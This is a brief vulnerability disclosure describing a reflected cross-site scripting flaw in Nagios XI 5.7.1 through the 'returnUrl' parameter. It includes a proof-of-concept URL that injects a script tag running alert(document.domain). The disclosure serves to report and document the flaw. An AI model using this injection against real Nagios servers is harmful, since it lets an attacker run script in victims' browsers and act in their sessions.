# Nagios-XI-Reflected-XSS
A reflected cross-site scripting (XSS) in [Nagios XI 5.7.1](https://www.nagios.com/downloads/nagios-xi/) can result in an attacker performing malicious actions to users who open a maliciously crafted link or third-party web page.

# PoC
To exploit vulnerability, someone could use a GET request to 'http://[server]/nagiosxi/includes/components/ccm/' by manipulating 'returnUrl' parameter in the request body to impact users who open a maliciously crafted link or third-party web page.

```
http://[server]/nagiosxi/includes/components/ccm/?cmd=modify&id=1&page=1&returnUrl=%22%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&type=host
```

![](https://emreovunc.com/blog/en/nagios_xi_5_7_1_reflected_xss.png)

![](https://emreovunc.com/blog/en/nagios_xi_5_7_1_reflected_xss_02.png)
